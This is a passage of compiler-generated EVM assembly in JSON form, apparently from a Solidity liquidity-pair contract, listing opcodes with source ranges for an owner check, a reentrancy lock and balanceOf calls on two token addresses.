											"end": 508,
											"name": "MSTORE"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "SWAP1"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "KECCAK256"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "SLOAD"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "DUP2"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "tag",
											"value": "80"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "JUMPDEST"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "PUSH",
											"value": "C"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "SLOAD"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "DUP2"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "tag",
											"value": "82"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "JUMPDEST"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "PUSH",
											"value": "D"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "SLOAD"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "DUP2"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1482,
											"end": 1599,
											"name": "tag",
											"value": "85"
										},
										{
											"begin": 1482,
											"end": 1599,
											"name": "JUMPDEST"
										},
										{
											"begin": 1415,
											"end": 1420,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1415,
											"end": 1420,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1415,
											"end": 1420,
											"name": "AND"
										},
										{
											"begin": 1401,
											"end": 1411,
											"name": "CALLER"
										},
										{
											"begin": 1401,
											"end": 1420,
											"name": "EQ"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "PUSH [tag]",
											"value": "199"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "JUMPI"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "DUP2"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "MSTORE"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "ADD"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "DUP1"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "DUP1"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "ADD"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "DUP3"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "DUP2"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "SUB"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "DUP3"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "MSTORE"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "PUSH",
											"value": "21"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "DUP2"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "MSTORE"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "ADD"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "DUP1"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "PUSH data",
											"value": "1B988F8784CC3CF7AD7D1BF59197DF07B7925B5A748A478400A8F83FD9E196EF"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "PUSH",
											"value": "21"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "SWAP2"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "CODECOPY"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "ADD"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "SWAP2"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "POP"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "POP"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "MLOAD"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "DUP1"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "SWAP2"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "SUB"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "SWAP1"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "REVERT"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "tag",
											"value": "199"
										},
										{
											"begin": 1393,
											"end": 1458,
											"name": "JUMPDEST"
										},
										{
											"begin": 1545,
											"end": 1551,
											"name": "PUSH",
											"value": "A"
										},
										{
											"begin": 1545,
											"end": 1561,
											"name": "SSTORE"
										},
										{
											"begin": 1482,
											"end": 1599,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 5261,
											"end": 6526,
											"name": "tag",
											"value": "88"
										},
										{
											"begin": 5261,
											"end": 6526,
											"name": "JUMPDEST"
										},
										{
											"begin": 5310,
											"end": 5324,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1205,
											"end": 1213,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 1205,
											"end": 1213,
											"name": "SLOAD"
										},
										{
											"begin": 1217,
											"end": 1218,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1205,
											"end": 1218,
											"name": "EQ"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH [tag]",
											"value": "202"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "JUMPI"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP2"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP3"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP3"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E881313D0D2D151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "8A"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP3"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MLOAD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP2"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SUB"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "REVERT"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "tag",
											"value": "202"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "JUMPDEST"
										},
										{
											"begin": 1259,
											"end": 1260,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1248,
											"end": 1256,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 1248,
											"end": 1260,
											"name": "DUP2"
										},
										{
											"begin": 1248,
											"end": 1260,
											"name": "SWAP1"
										},
										{
											"begin": 1248,
											"end": 1260,
											"name": "SSTORE"
										},
										{
											"begin": 1259,
											"end": 1260,
											"name": "DUP1"
										},
										{
											"begin": 5379,
											"end": 5392,
											"name": "PUSH [tag]",
											"value": "204"
										},
										{
											"begin": 5379,
											"end": 5390,
											"name": "PUSH [tag]",
											"value": "56"
										},
										{
											"begin": 5379,
											"end": 5392,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5379,
											"end": 5392,
											"name": "tag",
											"value": "204"
										},
										{
											"begin": 5379,
											"end": 5392,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5440,
											"end": 5446,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 5440,
											"end": 5446,
											"name": "SLOAD"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "DUP1"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "DUP2"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "MSTORE"
										},
										{
											"begin": 5466,
											"end": 5470,
											"name": "ADDRESS"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "DUP3"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "ADD"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "MSTORE"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "SWAP1"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "MLOAD"
										},
										{
											"begin": 5336,
											"end": 5392,
											"name": "SWAP4"
										},
										{
											"begin": 5336,
											"end": 5392,
											"name": "SWAP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5336,
											"end": 5392,
											"name": "SWAP2"
										},
										{
											"begin": 5336,
											"end": 5392,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5417,
											"end": 5430,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5417,
											"end": 5430,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 5440,
											"end": 5446,
											"name": "SWAP1"
										},
										{
											"begin": 5440,
											"end": 5446,
											"name": "SWAP2"
										},
										{
											"begin": 5440,
											"end": 5446,
											"name": "AND"
										},
										{
											"begin": 5440,
											"end": 5446,
											"name": "SWAP2"
										},
										{
											"begin": 5433,
											"end": 5457,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 5433,
											"end": 5457,
											"name": "SWAP2"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "DUP1"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "DUP4"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "ADD"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "SWAP3"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "SWAP3"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "SWAP2"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "SWAP1"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "DUP3"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "SWAP1"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "SUB"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "ADD"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "DUP2"
										},
										{
											"begin": 5440,
											"end": 5446,
											"name": "DUP7"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "DUP1"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "205"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "205"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "POP"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "GAS"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "STATICCALL"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "206"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "206"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "POP"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "POP"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "POP"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "POP"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "MLOAD"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "207"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "207"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "MLOAD"
										},
										{
											"begin": 5505,
											"end": 5511,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 5505,
											"end": 5511,
											"name": "SLOAD"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "DUP1"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "DUP2"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "MSTORE"
										},
										{
											"begin": 5531,
											"end": 5535,
											"name": "ADDRESS"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "DUP3"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "ADD"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "MSTORE"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "SWAP1"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "MLOAD"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "SWAP3"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5482,
											"end": 5495,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5482,
											"end": 5495,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 5505,
											"end": 5511,
											"name": "SWAP1"
										},
										{
											"begin": 5505,
											"end": 5511,
											"name": "SWAP3"
										},
										{
											"begin": 5505,
											"end": 5511,
											"name": "AND"
										},
										{
											"begin": 5505,
											"end": 5511,
											"name": "SWAP2"
										},
										{
											"begin": 5498,
											"end": 5522,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 5498,
											"end": 5522,
											"name": "SWAP2"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "DUP1"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "DUP3"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "ADD"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "SWAP3"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5433,
											"end": 5472,
											"name": "SWAP3"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "SWAP1"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "SWAP2"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "SWAP1"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "DUP3"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "SWAP1"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "SUB"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "ADD"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "DUP2"
										},
										{
											"begin": 5505,
											"end": 5511,
											"name": "DUP7"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "DUP1"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "208"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "208"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "POP"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "GAS"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "STATICCALL"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "209"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "209"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "POP"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "POP"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "POP"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "POP"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "MLOAD"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "210"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "210"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "MLOAD"
										},
										{
											"begin": 5498,
											"end": 5537,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5547,
											"end": 5559,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5562,
											"end": 5585,
											"name": "PUSH [tag]",
											"value": "211"
										},
										{
											"begin": 5562,
											"end": 5570,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 5562,
											"end": 5585,
											"name": "DUP8"
										},
										{
											"begin": 5562,
											"end": 5585,
											"name": "AND"
										},
										{
											"begin": 5562,
											"end": 5585,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 5562,
											"end": 5574,
											"name": "PUSH [tag]",
											"value": "177"
										},
										{
											"begin": 5562,
											"end": 5585,
											"name": "AND"
										},
										{
											"begin": 5562,
											"end": 5585,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5562,
											"end": 5585,
											"name": "tag",
											"value": "211"
										},
										{
											"begin": 5562,
											"end": 5585,
											"name": "JUMPDEST"
										},
										{
											"begin": 5547,
											"end": 5585,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5595,
											"end": 5607,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5610,
											"end": 5633,
											"name": "PUSH [tag]",
											"value": "212"
										},
										{
											"begin": 5610,
											"end": 5618,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 5610,
											"end": 5633,
											"name": "DUP8"
										},
										{
											"begin": 5610,
											"end": 5633,
											"name": "AND"
										},
										{
											"begin": 5610,
											"end": 5633,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 5610,
											"end": 5622,
											"name": "PUSH [tag]",
											"value": "177"
										},
										{
											"begin": 5610,
											"end": 5633,
											"name": "AND"
										},
										{
											"begin": 5610,
											"end": 5633,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5610,
											"end": 5633,
											"name": "tag",
											"value": "212"
										},
										{
											"begin": 5610,
											"end": 5633,
											"name": "JUMPDEST"
										},
										{
											"begin": 5595,
											"end": 5633,
											"name": "SWAP1"
										},
										{
											"begin": 5595,
											"end": 5633,
											"name": "POP"
										},
										{
											"begin": 5644,
											"end": 5654,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5657,
											"end": 5687,
											"name": "PUSH [tag]",
											"value": "213"
										},
										{
											"begin": 5666,
											"end": 5675,
											"name": "DUP8"
										},
										{
											"begin": 5677,
											"end": 5686,
											"name": "DUP8"
										},
										{
											"begin": 5657,
											"end": 5665,
											"name": "PUSH [tag]",
											"value": "214"
										},
										{
											"begin": 5657,
											"end": 5687,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5657,
											"end": 5687,
											"name": "tag",
											"value": "213"
										},
										{
											"begin": 5657,
											"end": 5687,
											"name": "JUMPDEST"
										},
										{
											"begin": 5697,
											"end": 5714,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5717,
											"end": 5728,
											"name": "SLOAD"
										},
										{
											"begin": 5644,
											"end": 5687,
											"name": "SWAP1"
										},
										{
											"begin": 5644,
											"end": 5687,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5820,
											"end": 5837,
											"name": "DUP1"
										},
										{
											"begin": 5816,
											"end": 6210,
											"name": "PUSH [tag]",
											"value": "215"
										},
										{
											"begin": 5816,
											"end": 6210,
											"name": "JUMPI"
										},
										{
											"begin": 5865,
											"end": 5919,
											"name": "PUSH [tag]",
											"value": "216"
